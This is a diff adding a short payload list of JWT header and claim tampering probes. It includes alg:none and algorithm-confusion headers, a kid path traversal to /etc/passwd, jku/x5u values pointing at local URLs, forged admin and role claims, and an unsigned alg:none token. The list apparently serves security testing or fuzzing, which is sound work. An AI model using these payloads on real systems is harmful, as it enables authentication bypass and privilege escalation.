@@ -1,0 +1,15 @@
+# JWT header and claim tampering probes
+{"alg":"none","typ":"JWT"}
+{"alg":"HS256","typ":"JWT"}
+{"alg":"RS256","typ":"JWT"}
+{"kid":"../../../../etc/passwd"}
+{"kid":"http://127.0.0.1/jwks.json"}
+{"jku":"http://127.0.0.1/jwks.json"}
+{"x5u":"http://127.0.0.1/cert.pem"}
+{"sub":"admin"}
+{"role":"admin"}
+{"roles":["admin"]}
+{"is_admin":true}
+{"scope":"admin:*"}
+{"tenant_id":"00000000-0000-0000-0000-000000000000"}
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.e30.
